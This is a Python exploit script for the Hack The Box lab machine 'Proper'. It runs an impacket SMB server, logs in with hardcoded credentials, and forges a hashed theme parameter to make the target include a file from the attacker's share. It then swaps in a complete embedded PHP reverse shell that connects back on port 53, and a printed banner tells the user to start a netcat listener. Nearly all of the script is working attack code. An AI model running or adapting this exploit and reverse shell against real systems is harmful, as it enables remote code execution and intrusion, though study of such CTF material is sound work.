import threading
import requests
import socket
import fcntl
import struct
import hashlib
import shutil
from time import sleep
from multiprocessing.dummy import Pool
from impacket import smbserver
from impacket.ntlm import compute_lmhash, compute_nthash

print('''
Script will detect tun0 IP for reverse shell
add to /etc/hosts
10.10.10.231    proper.htb
run netcat:
nc -nlvp 53 
''')    
def create_hash(theme_param):
    theme_param=str(theme_param)
    h=hashlib.md5(('hie0shah6ooNoim'+theme_param).encode('utf-8')).hexdigest()
    return h

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    ip = socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,
        struct.pack('256s',bytes(ifname[:15],'utf-8'))
        )[20:24])
    return ip

def start_smb_server():
    password = "charlotte123!"
    lmhash = compute_lmhash(password)
    nthash = compute_nthash(password)
    server = smbserver.SimpleSMBServer(listenAddress=get_ip_address('tun0'), listenPort=445)
    server.setLogFile('')
    server.addShare('myshare','.')
    server.setSMB2Support(True)
    server.addCredential("web",0,lmhash,nthash)
    server.start()
    
def create_files():
    

    PHP_REV_SHELL= '''
    <?php
    // Copyright (c) 2020 Ivan Šincek
    // v2.0
    // Requires PHP v5.0.0 or greater.
    // Works on Linux OS, macOS and Windows OS.
    // See the original script at https://github.com/pentestmonkey/php-reverse-shell.
    class Shell {
        private $addr  = null;
        private $port  = null;
        private $os    = null;
        private $shell = null;
        private $descriptorspec = array(
            0 => array('pipe', 'r'), // shell can read from STDIN
            1 => array('pipe', 'w'), // shell can write to STDOUT
            2 => array('pipe', 'w')  // shell can write to STDERR
        );
        private $options = array(); // proc_open() options
        private $buffer  = 1024;    // read/write buffer size
        private $clen    = 0;       // command length
        private $error   = false;   // stream read/write error
        public function __construct($addr, $port) {
            $this->addr = $addr;
            $this->port = $port;
            if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
                $this->os    = 'LINUX';
                $this->shell = '/bin/sh';
            } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
                $this->os    = 'WINDOWS';
                $this->shell = 'cmd.exe';
                $this->options['bypass_shell'] = true; // we do not want a shell within a shell
            } else {
                $this->error = true;
                echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
            }
        }
        private function daemonize() {
            $exit = false;
            @error_reporting(0);
            @set_time_limit(0); // do not impose the script execution time limit
            if (!function_exists('pcntl_fork')) {
                echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
            } else if (($pid = @pcntl_fork()) < 0) {
                echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
            } else if ($pid > 0) {
                $exit = true;
                echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
            } else if (posix_setsid() < 0) { // once daemonized you will no longer see the script's dump
                echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
            } else {
                echo "DAEMONIZE: Completed successfully!\n";
            }
            @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
            return $exit;
        }
        private function dump($data) {
            $data = str_replace('<', '&lt;', $data);
            $data = str_replace('>', '&gt;', $data);
            echo $data;
        }
        private function read($stream, $name, $buffer) {
            if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
                $this->error = true;                            // set global error flag
                echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";
            }
            return $data;
        }
        private function write($stream, $name, $data) {
            if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
                $this->error = true;                            // set global error flag
                echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";
            }
            return $bytes;
        }
        // read/write method for non-blocking streams
        private function rw($input, $output, $iname, $oname) {
            while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
                if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
                $this->dump($data); // script's dump
            }
        }
        // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
        // we must read the exact byte length from a stream and not a single byte more
        private function brw($input, $output, $iname, $oname) {
            $size = fstat($input)['size'];
            if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
                // for some reason Windows OS pipes STDIN into STDOUT
                // we do not like that
                // we need to discard the data from the stream
                while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                    $this->clen -= $bytes;
                    $size -= $bytes;
                }
            }
            while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
                $size -= $bytes;
                $this->dump($data); // script's dump
            }
        }
        public function run() {
            if (!$this->error && !$this->daemonize()) {
    
                // ----- SOCKET BEGIN -----
                $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
                if (!$socket) {
                    echo "SOC_ERROR: {$errno}: {$errstr}\n";
                } else {
                    stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS
    
                    // ----- SHELL BEGIN -----
                    $process = @proc_open($this->shell, $this->descriptorspec, $pipes, '/', null, $this->options);
                    if (!$process) {
                        echo "PROC_ERROR: Cannot start the shell\n";
                    } else {
                        foreach ($pipes as $pipe) {
                            stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                        }
    
                        // ----- WORK BEGIN -----
                        @fwrite($socket, "SOCKET: Shell has connected! PID: " . proc_get_status($process)['pid'] . "\n");
                        do {
                            if (feof($socket)) { // check for end-of-file on SOCKET
                                echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                            } else if (feof($pipes[1]) || !proc_get_status($process)['running']) { // check for end-of-file on STDOUT or if process is still running
                                echo "PROC_ERROR: Shell process has been terminated\n";   break;   // feof() does not work with blocking streams
                            }                                                                      // use proc_get_status() instead
                            $streams = array(
                                'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                                'write'  => null,
                                'except' => null
                            );
                            $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], null); // wait for stream changes | will not wait on Windows OS
                            if ($num_changed_streams === false) {
                                echo "STRM_ERROR: stream_select() failed\n"; break;
                            } else if ($num_changed_streams > 0) {
                                if ($this->os === 'LINUX') {
                                    if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                    if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                    if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                                } else if ($this->os === 'WINDOWS') {
                                    // order is important
                                    if (in_array($socket, $streams['read'])) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                    if (fstat($pipes[2])['size']/*-------*/) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                    if (fstat($pipes[1])['size']/*-------*/) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                                }
                            }
                        } while (!$this->error);
                        // ------ WORK END ------
    
                        foreach ($pipes as $pipe) {
                            fclose($pipe);
                        }
                        proc_close($process);
                    }
                    // ------ SHELL END ------
    
                    fclose($socket);
                }
                // ------ SOCKET END ------
    
            }
        }
    }
    echo '<pre>';
    // change the host address and/or port number as necessary
    $sh = new Shell('%s', 53);
    $sh->run();
    echo '</pre>';
    unset($sh);
    // garbage collector requires PHP v5.3.0 or greater
    // @gc_collect_cycles();
    ?>
    ''' % (get_ip_address('tun0'))
    
    #CREATE FILES
    with open('shell.php','a') as f:
        f.write(PHP_REV_SHELL)
        f.close()
    with open('header.inc','w') as header_inc:
        pass

#proxies = {'http':'http://127.0.0.1:8080'}

th = threading.Thread(target=start_smb_server)
th.start()


data = {
    'username':'vikki.solomon@throwaway.mail',
    'password':'password1'
    }

s = requests.session()
r = s.post("http://proper.htb/licenses/index.php",data=data)#,proxies=proxies)
pool = Pool(1)
theme_param = '\\\\'+get_ip_address('tun0')+'\myshare' 
create_files()
#using asycn so we don't wait for request to finish
pool.apply_async(s.post,args=['http://proper.htb/licenses/licenses.php?theme='+theme_param+'&h=%s' % create_hash(theme_param)])
sleep(2)
shutil.copyfile('header.inc','original_header.inc')
shutil.move('shell.php','header.inc')

th.join(10)
